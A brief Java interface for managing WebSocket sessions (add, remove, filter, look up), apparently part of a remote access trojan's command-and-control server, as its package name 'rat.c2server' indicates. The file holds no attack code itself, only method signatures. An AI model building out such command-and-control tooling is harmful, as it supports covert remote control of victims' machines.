package devs.alex.sah.rat.c2server.services;

import org.springframework.web.socket.*;

import java.util.HashMap;
import java.util.Map;

public interface WebSocketSessionService {

    void addSession(WebSocketSession session);
    void removeSession(WebSocketSession session);

    Map<String, WebSocketSession> getSessions(HashMap<String, Object> filters);
    WebSocketSession getSession(String key) /*throws SessionNotFound*/; // FIXME
}
